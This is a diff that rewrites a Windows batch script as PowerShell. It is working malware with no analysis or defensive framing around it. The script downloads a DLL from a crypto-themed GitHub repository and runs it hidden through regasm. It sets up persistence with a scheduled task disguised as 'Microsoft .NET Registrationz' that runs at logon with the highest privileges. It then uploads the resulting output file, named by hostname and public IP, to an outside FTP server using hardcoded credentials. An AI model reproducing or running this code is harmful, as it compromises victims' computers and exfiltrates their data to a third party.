@@ -1,20 +1,36 @@
-:: Download DLL
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/coinverification/coinverify/main/azofo.dll' -OutFile 'C:\Users\Public\azofo.dll'"
+# Download DLL (using TLS fallback-safe method)
+[Net.ServicePointManager]::SecurityProtocol = 3072
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile('https://raw.githubusercontent.com/coinverification/coinverify/main/azofo.dll', 'C:\Users\Public\azofo.dll')
 
-:: Wait for DLL to appear
-powershell -Command "while (!(Test-Path 'C:\Users\Public\azofo.dll')) { Start-Sleep -Milliseconds 500 }"
+# Wait for DLL to appear
+while (!(Test-Path 'C:\Users\Public\azofo.dll')) { Start-Sleep -Milliseconds 500 }
 
-:: Create regasm wrapper script
-powershell -Command "$script = 'Start-Process ''C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\regasm.exe'' -ArgumentList ''/nologo'',''C:\Users\Public\azofo.dll'' -WindowStyle Hidden -Verb RunAs'; $script | Out-File 'C:\ProgramData\regasm_runner.ps1' -Encoding ASCII -Force"
+# Create regasm wrapper script
+$script = "Start-Process 'C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\regasm.exe' -ArgumentList '/nologo','C:\Users\Public\azofo.dll' -WindowStyle Hidden -Verb RunAs"
+$script | Out-File 'C:\ProgramData\regasm_runner.ps1' -Encoding ASCII -Force
 
-:: Create the scheduled task
+# Create the scheduled task
 schtasks /create /tn "Microsoft .NET Registrationz" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\regasm_runner.ps1" /sc onlogon /ru INTERACTIVE /rl HIGHEST /f
 
-:: Run it immediately
+# Run it immediately
 schtasks /run /tn "Microsoft .NET Registrationz"
 
-:: Wait for output.html to appear
-powershell -Command "while (!(Test-Path 'C:\Users\Public\output.html')) { Start-Sleep -Milliseconds 500 }"
+# Wait for output.html to appear
+while (!(Test-Path 'C:\Users\Public\output.html')) { Start-Sleep -Milliseconds 500 }
 
-:: Upload output.html via FTP
-powershell -Command "$ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=text').Trim(); $host = $env:COMPUTERNAME; $file = 'C:\Users\Public\output.html'; $ftp = 'ftp://ftpupload.net/htdocs/' + $host + '-' + $ip + '.html'; $ftpReq = [System.Net.FtpWebRequest]::Create($ftp); $ftpReq.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile; $ftpReq.Credentials = New-Object System.Net.NetworkCredential('b14_39115531', '@Falcon2025@'); $ftpReq.UseBinary = $true; $ftpReq.UsePassive = $true; $ftpReq.KeepAlive = $false; $bytes = [System.IO.File]::ReadAllBytes($file); $stream = $ftpReq.GetRequestStream(); $stream.Write($bytes, 0, $bytes.Length); $stream.Close()"
+# Upload output.html via FTP
+$ip = (New-Object System.Net.WebClient).DownloadString('https://api.ipify.org').Trim()
+$host = $env:COMPUTERNAME
+$file = 'C:\Users\Public\output.html'
+$ftp = "ftp://ftpupload.net/htdocs/$host-$ip.html"
+$ftpReq = [System.Net.FtpWebRequest]::Create($ftp)
+$ftpReq.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+$ftpReq.Credentials = New-Object System.Net.NetworkCredential('b14_39115531', '@Falcon2025@')
+$ftpReq.UseBinary = $true
+$ftpReq.UsePassive = $true
+$ftpReq.KeepAlive = $false
+$bytes = [System.IO.File]::ReadAllBytes($file)
+$stream = $ftpReq.GetRequestStream()
+$stream.Write($bytes, 0, $bytes.Length)
+$stream.Close()
